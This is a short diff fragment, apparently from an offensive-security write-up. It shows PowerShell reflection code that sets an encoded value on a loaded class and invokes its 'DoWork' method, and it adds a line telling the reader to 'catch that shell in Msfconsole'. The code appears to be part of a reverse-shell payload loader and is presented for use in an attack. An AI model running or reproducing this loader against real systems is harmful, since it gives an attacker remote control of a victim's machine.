@@ -58,3 +58,4 @@ $class.GetProperty('IV').SetValue(0,'AGcABgUAdAAGBgB1AAYDAGsABgUAZA==');
 $method = $class.GetMethod("DoWork"); 
 $method.Invoke(0,$null)
 ```
+Then catch that shell in Msfconsole for the win ;)
